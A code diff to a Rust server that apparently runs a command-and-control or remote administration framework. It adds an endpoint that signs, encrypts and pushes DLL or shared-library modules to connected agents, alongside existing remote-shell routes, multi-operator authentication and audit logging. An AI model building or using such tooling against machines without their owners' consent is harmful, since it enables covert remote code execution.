@@ -14,8 +14,10 @@ use axum::{
     Json, Router,
 };
 use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
-use common::{Command, Message, Outcome};
+use common::{Command, CryptoSession, Message, Outcome};
+use ed25519_dalek::Signer;
 use serde::{Deserialize, Serialize};
+use sha2::{Digest, Sha256};
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::sync::oneshot;
@@ -51,6 +53,17 @@ pub struct ShellOutputReply {
     pub data: String,
 }
 
+#[derive(Deserialize)]
+pub struct PushModuleRequest {
+    /// Logical module name (used by the agent for plugin registry key).
+    pub module_name: String,
+    /// Version string forwarded to the agent.
+    #[serde(default)]
+    pub version: String,
+    /// Base64-encoded module binary (shared library / DLL).
+    pub module_data: String,
+}
+
 pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
     // Routes that require the standard `Authorization: Bearer <token>` header.
     let api_authed = Router::new()
@@ -75,6 +88,7 @@ pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
         .route("/agents/:id/shell", post(open_shell))
         .route("/agents/:id/shell/:sid/input", post(shell_input))
         .route("/agents/:id/shell/:sid/output", get(shell_output))
+        .route("/agents/:id/push-module", post(push_module))
         .route_layer(middleware::from_fn_with_state(
             state.clone(),
             require_bearer,
@@ -148,6 +162,128 @@ async fn shell_output(
     let reply = dispatch_command(state, user, entry, cmd_req).await?;
     let data = reply.0.output.unwrap_or_default();
     Ok(Json(ShellOutputReply { data }))
+}
+
+/// Sign a module binary with Ed25519.
+///
+/// The signature covers `SHA-256(module_bytes) || module_bytes` so that
+/// the verifier can check both integrity and authenticity in one shot.
+/// Returns `[64-byte Ed25519 signature][module_bytes]`.
+fn sign_module(
+    signing_key: &ed25519_dalek::SigningKey,
+    module_bytes: &[u8],
+) -> Vec<u8> {
+    // Compute SHA-256(module_bytes) || module_bytes.
+    let hash = Sha256::digest(module_bytes);
+    let mut msg = Vec::with_capacity(32 + module_bytes.len());
+    msg.extend_from_slice(&hash);
+    msg.extend_from_slice(module_bytes);
+
+    let signature = signing_key.sign(&msg);
+    let mut out = Vec::with_capacity(64 + module_bytes.len());
+    out.extend_from_slice(signature.to_bytes().as_ref());
+    out.extend_from_slice(module_bytes);
+    out
+}
+
+/// Load the Ed25519 signing key from server config (base64-encoded 32-byte seed).
+fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (StatusCode, String)> {
+    let b64 = state
+        .config
+        .module_signing_key
+        .as_ref()
+        .ok_or((
+            StatusCode::INTERNAL_SERVER_ERROR,
+            "module_signing_key not configured on server".into(),
+        ))?;
+    let bytes = B64
+        .decode(b64)
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key is not valid base64".into()))?;
+    let seed: [u8; 32] = bytes
+        .try_into()
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key must be exactly 32 bytes".into()))?;
+    Ok(ed25519_dalek::SigningKey::from_bytes(&seed))
+}
+
+/// Load the module AES key from server config and build a `CryptoSession`.
+fn load_module_crypto(state: &AppState) -> Result<CryptoSession, (StatusCode, String)> {
+    let b64 = state
+        .config
+        .module_aes_key
+        .as_ref()
+        .ok_or((
+            StatusCode::INTERNAL_SERVER_ERROR,
+            "module_aes_key not configured on server".into(),
+        ))?;
+    let bytes = B64
+        .decode(b64)
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key is not valid base64".into()))?;
+    let key: [u8; 32] = bytes
+        .try_into()
+        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key must be exactly 32 bytes".into()))?;
+    Ok(CryptoSession::from_key(key))
+}
+
+/// `POST /api/agents/:id/push-module`
+///
+/// Sign a module binary with the server's Ed25519 key, AES-encrypt the
+/// signed payload, and push it to the agent as a `ModulePush` message.
+async fn push_module(
+    State(state): State<Arc<AppState>>,
+    Extension(user): Extension<AuthenticatedUser>,
+    Path(agent_id): Path<String>,
+    Json(req): Json<PushModuleRequest>,
+) -> Result<Json<CommandReply>, (StatusCode, String)> {
+    let entry = state
+        .find_by_agent_id(&agent_id)
+        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
+
+    // Decode the base64 module binary.
+    let module_bytes = B64
+        .decode(&req.module_data)
+        .map_err(|_| (StatusCode::BAD_REQUEST, "module_data is not valid base64".into()))?;
+
+    // Sign the module.
+    let signing_key = load_signing_key(&state)?;
+    let signed = sign_module(&signing_key, &module_bytes);
+
+    // Encrypt with the shared AES key.
+    let crypto = load_module_crypto(&state)?;
+    let encrypted_blob = crypto.encrypt(&signed);
+
+    // Send ModulePush to the agent.
+    let msg = Message::ModulePush {
+        module_name: req.module_name.clone(),
+        version: req.version.clone(),
+        encrypted_blob,
+    };
+    if entry.tx.send(msg).await.is_err() {
+        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
+    }
+
+    state.audit.record_simple(
+        &agent_id,
+        &user.0,
+        "PushModule",
+        &format!(
+            "PushModule(module={:?}, version={:?}, size={})",
+            req.module_name,
+            req.version,
+            module_bytes.len()
+        ),
+        Outcome::Success,
+    );
+
+    Ok(Json(CommandReply {
+        task_id: String::new(),
+        outcome: "pushed",
+        output: Some(format!(
+            "module '{}' ({} bytes) signed and pushed",
+            req.module_name,
+            module_bytes.len()
+        )),
+        error: None,
+    }))
 }
 
 async fn send_command_by_agent_id(
@@ -334,6 +470,16 @@ async fn ws_handler(
     };
 
     use subtle::ConstantTimeEq;
+
+    // 1. Try the multi-operator store.
+    if let Some(operator_id) = state.authenticate_operator(&token) {
+        let subprotocol = format!("bearer.{}", token);
+        return ws
+            .protocols([subprotocol])
+            .on_upgrade(move |sock| ws_loop(sock, state, operator_id));
+    }
+
+    // 2. Fallback: legacy single admin token.
     let ok: bool = token.as_bytes().ct_eq(state.admin_token.as_bytes()).into();
     if !ok {
         return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
@@ -343,7 +489,7 @@ async fn ws_handler(
     // upgrade (otherwise the handshake fails).
     let subprotocol = format!("bearer.{}", token);
     ws.protocols([subprotocol])
-        .on_upgrade(move |sock| ws_loop(sock, state))
+        .on_upgrade(move |sock| ws_loop(sock, state, "admin".into()))
 }
 
 fn extract_bearer_subprotocol(header: &str) -> Option<String> {
@@ -360,9 +506,17 @@ enum DashboardEvent {
     Audit { event: common::AuditEvent },
 }
 
-async fn ws_loop(mut socket: WebSocket, state: Arc<AppState>) {
+async fn ws_loop(mut socket: WebSocket, state: Arc<AppState>, operator_id: String) {
     let mut audit_rx = state.audit.subscribe();
     let mut tick = tokio::time::interval(Duration::from_secs(2));
+    // Log the WebSocket connection with operator attribution.
+    state.audit.record_simple(
+        "",
+        &operator_id,
+        "WebSocketConnect",
+        "dashboard websocket session opened",
+        common::Outcome::Success,
+    );
     // Send an initial snapshot.
     if send_snapshot(&mut socket, &state).await.is_err() {
         return;
